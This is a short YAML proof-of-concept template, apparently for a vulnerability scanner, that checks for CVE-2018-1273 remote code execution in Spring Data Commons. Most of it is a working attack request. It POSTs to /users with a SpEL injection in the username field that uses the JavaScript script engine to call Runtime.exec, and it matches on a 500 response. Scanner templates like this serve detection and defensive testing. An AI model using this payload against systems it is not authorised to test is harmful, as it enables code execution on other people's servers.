name: poc-yaml-spring-data-commons-cve-2018-1273-rce
set:
  r1: randomLowercase(10)
rules:
  - method: POST
    path: /users
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: >-
      username[#this.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(r1)")]=test
    follow_redirects: true
    expression: >
      response.status == 500 && response.body.bcontains(bytes("r1"))
detail:
  author: x1n9Qi8
  links:
    - https://pivotal.io/security/cve-2018-1273
